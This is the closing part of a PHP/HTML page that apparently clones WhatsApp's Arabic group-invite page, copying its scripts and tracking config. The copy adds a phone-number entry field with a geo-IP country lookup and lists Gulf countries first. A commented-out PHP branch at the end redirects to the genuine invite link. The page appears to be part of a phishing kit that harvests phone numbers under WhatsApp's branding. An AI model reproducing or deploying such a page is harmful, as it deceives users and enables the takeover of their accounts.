{ "m": ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "PageTransitions", "Animation"] }, "be": 1 }, "XSalesPromoWWWDetailsDialogAsyncController": { "r": ["gWMJgTe"], "be": 1 }, "XOfferController": { "r": ["hIek+bG"], "be": 1 }, "PerfXSharedFields": { "r": ["a1GO+nL", "gjt0UlN"], "be": 1 }, "ODS": { "r": ["LX1aYVl", "a2YBUdi"], "be": 1 }, "Dialog": { "r": ["LX1aYVl", "aMZ15\/K", "Af0v4Z0", "K7ursti", "EqTnb+\/", "IsaKnm5", "my4T6B4", "9G3hptj", "uW12T1t", "DS80Qf6", "WRhAqCJ", "gjt0UlN", "K95O88f", "lGcuWFY", "FW+GhOb", "R5w1rCJ", "e6uIOhT"], "rds": { "m": ["FbtLogging", "IntlQtEventFalcoEvent", "Animation", "PageTransitions", "BanzaiScuba_DEPRECATED"], "r": ["a2YBUdi"] }, "be": 1 }, "ExceptionDialog": { "r": ["WRhAqCJ", "LX1aYVl", "zV8nP9g", "Af0v4Z0", "aMZ15\/K", "uW12T1t", "R5w1rCJ", "DS80Qf6", "my4T6B4", "gjt0UlN", "9G3hptj", "FW+GhOb", "3v0vBAN", "EqTnb+\/", "K7ursti", "IsaKnm5", "anQXi\/0", "dDsarxb", "OjcdEI8", "a2YBUdi", "e6uIOhT", "vQ2oxzP", "woU7G1a", "20549oV"], "rds": { "m": ["FbtLogging", "IntlQtEventFalcoEvent"] }, "be": 1 }, "QuickSandSolver": { "r": ["LX1aYVl", "Af0v4Z0", "aMZ15\/K", "DS80Qf6", "WRhAqCJ", "8ELCBwH", "anQXi\/0", "1tEzGmI", "SWx3yNv", "x22Oby4", "FW+GhOb", "e6uIOhT"], "rds": { "m": ["FbtLogging", "IntlQtEventFalcoEvent"], "r": ["a2YBUdi"] }, "be": 1 }, "ConfirmationDialog": { "r": ["LX1aYVl", "Af0v4Z0", "DS80Qf6", "WRhAqCJ", "aMZ15\/K", "G2yK9wR", "FW+GhOb"], "be": 1 }, "MWADeveloperReauthBarrier": { "r": ["UWlPw6D", "uW12T1t", "my4T6B4", "VhquNVl", "161SwvX", "H\/5lfuF"], "be": 1 } } }) });</script>
    <script>requireLazy(["InitialJSLoader"], function (InitialJSLoader) { InitialJSLoader.loadOnDOMContentReady(["LX1aYVl", "Af0v4Z0", "a2YBUdi", "uW12T1t", "8TNZYzX"]); });</script>
    <script>requireLazy(["TimeSliceImpl", "ServerJS"], function (TimeSlice, ServerJS) { var s = (new ServerJS()); s.handle({ "elements": [["__elem_4c2b90dc_0_0_Rx", "u_0_0_cE", 1], ["__elem_bb0debb2_0_0_tk", "u_0_1_7V", 1], ["__elem_7af142ae_0_0_5u", "u_0_2_uv", 1], ["__elem_bb0debb2_0_1_4+", "u_0_3_bs", 1], ["__elem_ded6210b_0_0_eD", "u_0_4_U+", 1], ["__elem_11edcf69_0_2_aR", "u_0_5_iX", 1], ["__elem_11edcf69_0_3_9A", "u_0_6_mR", 1], ["__elem_0cdc66ad_0_0_DJ", "u_0_7_wr", 1], ["__elem_ded6210b_0_1_M3", "u_0_8_iz", 1], ["__elem_11edcf69_0_0_0O", "u_0_9_0k", 1], ["__elem_11edcf69_0_1_mF", "u_0_a_dn", 1]], "require": [["WhatsAppApiOpenUrl", "open_custom_url", [], [{ "url": "whatsapp:\/\/chat\/?code=--sanitized-S228802--", "userAgentMetadata": { "browser": "Other", "isMobile": false, "isTablet": false }, "shouldAutoload": false }]], ["ScriptPath", "set", [], ["WAXWhatsAppChatInviteController", "a1f3c513", { "imp_id": "1vjkiLOcr90Bsj4j2", "ef_page": null, "uri": "https:\/\/chat.whatsapp.com\/--sanitized-S228802--?lang=ar" }]], ["WhatsAppFAQClientListener", "attachGetInTouchClickListener", [], [""]], ["WAUILanguageSelectDropdown", "init", ["__elem_11edcf69_0_0_0O"], [{ "__m": "__elem_11edcf69_0_0_0O" }]], ["WAUILanguageSelectDropdown", "init", ["__elem_11edcf69_0_1_mF"], [{ "__m": "__elem_11edcf69_0_1_mF" }]], ["WAUIHeader", "init", ["__elem_4c2b90dc_0_0_Rx"], [{ "root": { "__m": "__elem_4c2b90dc_0_0_Rx" } }]], ["WAUIHamburgerMenu", "init", ["__elem_bb0debb2_0_0_tk", "__elem_bb0debb2_0_1_4+", "__elem_7af142ae_0_0_5u"], [{ "openButton": { "__m": "__elem_bb0debb2_0_0_tk" }, "closeButton": { "__m": "__elem_bb0debb2_0_1_4+" }, "container": { "__m": "__elem_7af142ae_0_0_5u" } }]], ["WAUIAccordion", "init", ["__elem_ded6210b_0_0_eD"], [{ "__m": "__elem_ded6210b_0_0_eD" }]], ["WAUILanguageSelectDropdown", "init", ["__elem_11edcf69_0_2_aR"], [{ "__m": "__elem_11edcf69_0_2_aR" }]], ["WAUILanguageSelectDropdown", "init", ["__elem_11edcf69_0_3_9A"], [{ "__m": "__elem_11edcf69_0_3_9A" }]], ["WAUINavItem", "init", ["__elem_0cdc66ad_0_0_DJ", "__elem_ded6210b_0_1_M3"], [{ "button": { "__m": "__elem_0cdc66ad_0_0_DJ" }, "subNav": { "__m": "__elem_ded6210b_0_1_M3" } }]], ["TimeSliceImpl"], ["HasteSupportData"], ["ServerJS"], ["Run"], ["InitialJSLoader"]] }); requireLazy(["Run"], function (Run) { Run.onAfterLoad(function () { s.cleanup(TimeSlice) }) }); });</script>
    <script>now_inl = (function () { var p = window.performance; return p && p.now && p.timing && p.timing.navigationStart ? function () { return p.now() + p.timing.navigationStart } : function () { return new Date().getTime() }; })(); window.__bigPipeFR = now_inl();</script>
    <link rel="preload" href="https://static.whatsapp.net/rsrc.php/v3/yC/l/1,cross/iZFW4Wn89pz.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous">
    <link rel="preload" href="https://static.whatsapp.net/rsrc.php/v3/yd/l/1,cross/X2fu9uuqQru.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous">
    <link rel="preload" href="https://static.whatsapp.net/rsrc.php/v3/yK/l/1,cross/ZMlOtpPQ11J.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous">
    <script>window.__bigPipeCtor = now_inl(); requireLazy(["BigPipe"], function (BigPipe) { define("__bigPipe", [], window.bigPipe = new BigPipe({ "forceFinish": true, "config": null })); });</script>
    <script
        nonce="">(function () { var n = now_inl(); requireLazy(["__bigPipe"], function (bigPipe) { bigPipe.beforePageletArrive("first_response", n); }) })();</script>
    <script
        nonce="">requireLazy(["__bigPipe"], (function (bigPipe) { bigPipe.onPageletArrive({ displayResources: ["lR1wO42", "FW+GhOb", "e6uIOhT"], id: "first_response", phase: 0, last_in_phase: true, tti_phase: 0, hsrp: { hblp: { consistency: { rev: 1007374203 } } }, allResources: ["lR1wO42", "FW+GhOb", "e6uIOhT", "LX1aYVl", "Af0v4Z0", "a2YBUdi", "uW12T1t", "8TNZYzX"] }); }));</script>
    <script>requireLazy(["__bigPipe"], function (bigPipe) { bigPipe.setPageID("7225915425268584351") });</script>
    <script
        nonce="">(function () { var n = now_inl(); requireLazy(["__bigPipe"], function (bigPipe) { bigPipe.beforePageletArrive("last_response", n); }) })();</script>
    <script
        nonce="">requireLazy(["__bigPipe"], (function (bigPipe) { bigPipe.onPageletArrive({ displayResources: ["a2YBUdi", "e6uIOhT"], id: "last_response", phase: 1, last_in_phase: true, the_end: true, jsmods: { define: [["TimeSliceInteractionSV", [], { on_demand_reference_counting: true, on_demand_profiling_counters: true, default_rate: 1000, lite_default_rate: 100, interaction_to_lite_coinflip: { ADS_INTERFACES_INTERACTION: 0, ads_perf_scenario: 0, ads_wait_time: 0, Event: 1 }, interaction_to_coinflip: { ADS_INTERFACES_INTERACTION: 1, ads_perf_scenario: 1, ads_wait_time: 1, Event: 100 }, enable_heartbeat: true, maxBlockMergeDuration: 0, maxBlockMergeDistance: 0, enable_banzai_stream: true, user_timing_coinflip: 50, banzai_stream_coinflip: 0, compression_enabled: true, ref_counting_fix: false, ref_counting_cont_fix: false, also_record_new_timeslice_format: false, force_async_request_tracing_on: false }, 2609], ["BrowserPaymentHandlerConfig", [], { enabled: false }, 3904], ["TimeSpentConfig", [], { delay: 1000, timeout: 64, "0_delay": 0, "0_timeout": 8 }, 142], ["TrackingConfig", [], { domain: "https://pixel.facebook.com" }, 325], ["cr:1642797", ["BanzaiBase"], { __rc: ["BanzaiBase", "Aa3GxwBv0_lqP8afnOBwAzTCS4ANfYXRTdskWGgckHa6sdKMoMUkPkaE2LtLeAhyLHZsDFwdydl77wy3N_Q_NWIRkYg"] }, -1], ["cr:1353359", ["EventListenerImplForBlue"], { __rc: ["EventListenerImplForBlue", "Aa2VJQbtcU_Vd5RDFvDIv8qtWIG70WqkiGV9pVotB5OSgqV27P2lWLlsnO5ImJII-cPTkoM7aq_nBavNb3ohmq6om284te-rtw"] }, -1], ["cr:844180", ["TimeSpentImmediateActiveSecondsLoggerBlue"], { __rc: ["TimeSpentImmediateActiveSecondsLoggerBlue", "Aa3GxwBv0_lqP8afnOBwAzTCS4ANfYXRTdskWGgckHa6sdKMoMUkPkaE2LtLeAhyLHZsDFwdydl77wy3N_Q_NWIRkYg"] }, -1], ["cr:1187159", ["BlueCompatBroker"], { __rc: ["BlueCompatBroker", "Aa3GxwBv0_lqP8afnOBwAzTCS4ANfYXRTdskWGgckHa6sdKMoMUkPkaE2LtLeAhyLHZsDFwdydl77wy3N_Q_NWIRkYg"] }, -1], ["cr:1634616", ["UserActivityBlue"], { __rc: ["UserActivityBlue", "Aa3GxwBv0_lqP8afnOBwAzTCS4ANfYXRTdskWGgckHa6sdKMoMUkPkaE2LtLeAhyLHZsDFwdydl77wy3N_Q_NWIRkYg"] }, -1], ["cr:5800", [], { __rc: [null, "Aa31tpeQlaMEXGgXtqYYiGg1AbEBy4IdcXzrz_jQyXLKmj54Yq4lwLQySv0oZEXXTA98eEZ3DNW7vqpsTUE-C7pL6R4"] }, -1], ["BanzaiConfig", [], { MAX_SIZE: 10000, MAX_WAIT: 150000, MIN_WAIT: null, RESTORE_WAIT: 150000, blacklist: ["time_spent"], disabled: false, gks: { boosted_pagelikes: true, mercury_send_error_logging: true, platform_oauth_client_events: true, graphexplorer: true, sticker_search_ranking: true }, known_routes: ["artillery_javascript_actions", "artillery_javascript_trace", "artillery_logger_data", "logger", "falco", "gk2_exposure", "js_error_logging", "loom_trace", "marauder", "perfx_custom_logger_endpoint", "qex", "require_cond_exposure_logging"], should_drop_unknown_routes: true, should_log_unknown_routes: false }, 7], ["ImmediateActiveSecondsConfig", [], { sampling_rate: 0 }, 423], ["cr:692209", ["cancelIdleCallbackBlue"], { __rc: ["cancelIdleCallbackBlue", "Aa3GxwBv0_lqP8afnOBwAzTCS4ANfYXRTdskWGgckHa6sdKMoMUkPkaE2LtLeAhyLHZsDFwdydl77wy3N_Q_NWIRkYg"] }, -1]], require: [["NavigationMetrics", "setPage", [], [{ page: "WAXWhatsAppChatInviteController", page_type: "normal", page_uri: "https://chat.whatsapp.com/--sanitized-S228802--?lang=ar", serverLID: "7225915425268584351" }]], ["FalcoLoggerTransports", "attach", [], []], ["Chromedome", "start", [], [{}]], ["DimensionTracking"], ["NavigationClickPointHandler"], ["ServiceWorkerURLCleaner", "removeRedirectID", [], []], ["Artillery", "disable", [], []], ["ScriptPathLogger", "startLogging", [], []], ["TimeSpentBitArrayLogger", "init", [], []], ["ClickRefLogger"], ["DetectBrokenProxyCache", "run", [], [0, "c_user"]], ["TransportSelectingClientSingletonConditional"], ["RequireDeferredReference", "unblock", [], [["TransportSelectingClientSingletonConditional", "FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED"], "sd"]], ["RequireDeferredReference", "unblock", [], [["TransportSelectingClientSingletonConditional", "FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED"], "css"]]] }, hsrp: { hsdp: { clpData: { "1829319": { r: 1 }, "1829320": { r: 1 }, "1843988": { r: 1 } } }, hblp: { consistency: { rev: 1007374203 } } }, allResources: ["a2YBUdi", "e6uIOhT", "WRhAqCJ", "LX1aYVl", "Af0v4Z0"] }); }));</script>

        <script src="build/js/intlTelInput.js"></script>
<script>
  var input = document.querySelector("#phone");
  window.intlTelInput(input, {
    // allowDropdown: false,
    // autoHideDialCode: false,
    // autoPlaceholder: "off",
    // dropdownContainer: document.body,
    // excludeCountries: ["us"],
    // formatOnDisplay: false,
   geoIpLookup: function(callback) {
      $.get("http://ipinfo.io", function() {}, "jsonp").always(function(resp) {
      var countryCode = (resp && resp.country) ? resp.country : "";
      callback(countryCode);
     });
     },
    // hiddenInput: "full_number",
   //  initialCountry: "auto",
    // localizedCountries: { 'de': 'Deutschland' },
    // nationalMode: false,
    // onlyCountries: ['us', 'gb', 'ch', 'ca', 'do'],
    // placeholderNumberType: "MOBILE",
    preferredCountries: ['sa', 'ae', 'qa','om','bh','sa','ma'],
    separateDialCode: true,
    defaultCountry: "sa",
    utilsScript: "build/js/utils.js",
  });
</script>
        </body>

</html>
<?php 
/*} else {


    header('location :https://chat.whatsapp.com/--sanitized-S228802--?lang=ar');
}*/
?>